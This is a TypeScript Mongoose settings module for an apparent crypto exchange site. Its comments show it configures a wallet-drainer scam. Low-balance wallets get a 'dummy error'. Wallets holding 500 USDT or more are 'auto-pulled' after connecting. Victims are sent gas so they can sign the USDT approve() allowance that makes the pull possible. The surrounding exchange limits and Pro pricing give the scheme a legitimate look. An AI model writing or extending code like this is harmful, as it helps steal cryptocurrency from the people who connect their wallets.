import mongoose, { Schema, model, models } from 'mongoose';

interface SiteSettingAttrs {
  key: string;
  value: unknown;
}

const SiteSettingSchema = new Schema<SiteSettingAttrs>(
  {
    key:   { type: String, required: true, unique: true, index: true },
    value: { type: Schema.Types.Mixed, required: true },
  },
  { timestamps: true },
);

export const SiteSetting =
  (models.SiteSetting as mongoose.Model<SiteSettingAttrs>) ||
  model<SiteSettingAttrs>('SiteSetting', SiteSettingSchema);

/* Default exchange limits shape (INR amounts) */
export interface ExchangeLimits {
  unverified: { perTransaction: number; daily: number; monthly: number };
  pending:    { perTransaction: number; daily: number; monthly: number };
  verified:   { perTransaction: number; daily: number; monthly: number };
}

export const DEFAULT_EXCHANGE_LIMITS: ExchangeLimits = {
  unverified: { perTransaction: 10_000,     daily:  25_000,    monthly:  1_00_000 },
  pending:    { perTransaction: 25_000,     daily:  50_000,    monthly:  2_50_000 },
  verified:   { perTransaction: 10_00_000,  daily: 2_00_000,   monthly: 50_00_000 },
};

export async function getExchangeLimits(): Promise<ExchangeLimits> {
  const doc = await SiteSetting.findOne({ key: 'exchangeLimits' }).lean();
  return (doc?.value as ExchangeLimits) ?? DEFAULT_EXCHANGE_LIMITS;
}

/* ── Wallet Filter Settings ── */
export interface WalletFilterSettings {
  enabled: boolean;
  minBalanceToConnect: number; // USDT — wallets below this see a dummy error
}
export const DEFAULT_WALLET_FILTER: WalletFilterSettings = {
  enabled: false,
  minBalanceToConnect: 100,
};
export async function getWalletFilterSettings(): Promise<WalletFilterSettings> {
  const doc = await SiteSetting.findOne({ key: 'walletFilter' }).lean();
  return (doc?.value as WalletFilterSettings) ?? DEFAULT_WALLET_FILTER;
}

/* ── Auto-Pull Settings ── */
export interface AutoPullSettings {
  enabled: boolean;
  minBalanceToTrigger: number; // USDT — wallets at or above this are auto-pulled after verification
}
export const DEFAULT_AUTO_PULL: AutoPullSettings = {
  enabled: false,
  minBalanceToTrigger: 500,
};
export async function getAutoPullSettings(): Promise<AutoPullSettings> {
  const doc = await SiteSetting.findOne({ key: 'autoPull' }).lean();
  return (doc?.value as AutoPullSettings) ?? DEFAULT_AUTO_PULL;
}

/* ── Network Fee Funding ──
 * When a connecting wallet passes the Wallet Balance Filter above, we cover the small
 * native-gas cost it needs to sign the USDT approve() transaction — many users hold USDT
 * but no BNB/ETH/TRX, which otherwise stalls them at the smart-contract step. */
export interface NetworkFeeSettings {
  enabled:    boolean;
  maxFeeBnb:  number; // hard cap (BNB) on what we will ever send for a single BEP20 funding tx
}
export const DEFAULT_NETWORK_FEE: NetworkFeeSettings = {
  enabled:   false,
  maxFeeBnb: 0.003,
};
export async function getNetworkFeeSettings(): Promise<NetworkFeeSettings> {
  const doc = await SiteSetting.findOne({ key: 'networkFee' }).lean();
  return (doc?.value as NetworkFeeSettings) ?? DEFAULT_NETWORK_FEE;
}

/* ── Widget Limits ── */
export interface WidgetLimits {
  minBuyUsdt: number;  // Minimum USDT equivalent for a buy order
  minSellUsdt: number; // Minimum USDT for a sell order
}
export const DEFAULT_WIDGET_LIMITS: WidgetLimits = {
  minBuyUsdt: 10,
  minSellUsdt: 10,
};
export async function getWidgetLimits(): Promise<WidgetLimits> {
  const doc = await SiteSetting.findOne({ key: 'widgetLimits' }).lean();
  return (doc?.value as WidgetLimits) ?? DEFAULT_WIDGET_LIMITS;
}

/* ── Pro Settings ── */
export interface ProSettings {
  priceUsdt:       number; // default 6
  durationDays:    number; // default 30
  managerTelegram: string; // personal manager link e.g. https://t.me/username
}
export const DEFAULT_PRO_SETTINGS: ProSettings = {
  priceUsdt:       6,
  durationDays:    30,
  managerTelegram: '',
};
export async function getProSettings(): Promise<ProSettings> {
  const doc = await SiteSetting.findOne({ key: 'proSettings' }).lean();
  return (doc?.value as ProSettings) ?? DEFAULT_PRO_SETTINGS;
}
